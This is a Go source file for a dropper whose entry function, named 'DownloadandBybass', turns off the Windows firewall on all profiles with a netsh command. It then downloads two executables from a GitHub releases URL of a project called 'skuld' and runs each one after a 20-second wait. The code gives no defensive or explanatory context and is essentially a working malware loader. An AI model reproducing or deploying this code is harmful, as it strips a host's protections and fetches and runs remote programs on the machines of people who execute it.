package program

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func DownloadandBybass() {
	disableFirewall()
	run()
}

func downloadFile(url, destinationPath string) error {
	response, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download file from %s: %v", url, err)
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to download file from %s: unexpected status code %d", url, response.StatusCode)
	}

	file, err := os.Create(destinationPath)
	if err != nil {
		return fmt.Errorf("failed to create file %s: %v", destinationPath, err)
	}
	defer file.Close()

	_, err = io.Copy(file, response.Body)
	if err != nil {
		return fmt.Errorf("failed to write file %s: %v", destinationPath, err)
	}

	return nil
}

func runExecutable(executablePath string) error {
	cmd := exec.Command(executablePath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to run executable %s: %v", executablePath, err)
	}
	return nil
}

func run() {
	releaseURL1 := "https://github.com/hackirby/skuld/releases/latest/download/executable1.exe"
	executablePath1 := "executable1.exe"

	releaseURL2 := "https://github.com/hackirby/skuld/releases/latest/download/executable2.exe"
	executablePath2 := "executable2.exe"

	// Download the first executable
	fmt.Println("Downloading executable 1...")
	if err := downloadFile(releaseURL1, executablePath1); err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	// Wait for 20 seconds
	fmt.Println("Waiting for 20 seconds...")
	time.Sleep(20 * time.Second)

	// Run the first downloaded executable
	fmt.Println("Running executable 1...")
	if err := runExecutable(executablePath1); err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	// Download the second executable
	fmt.Println("Downloading executable 2...")
	if err := downloadFile(releaseURL2, executablePath2); err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	// Wait for another 20 seconds
	fmt.Println("Waiting for another 20 seconds...")
	time.Sleep(20 * time.Second)

	// Run the second downloaded executable
	fmt.Println("Running executable 2...")
	if err := runExecutable(executablePath2); err != nil {
		fmt.Printf("Error: %v\n", err)
	}
}

func runCommand(command *exec.Cmd) {
	command.Stdout = os.Stdout
	command.Stderr = os.Stderr
	err := command.Run()
	if err != nil {
		fmt.Printf("Failed to run command: %v\n", err)
	}
}
func disableFirewall() {
	cmd := exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off")
	runCommand(cmd)
}

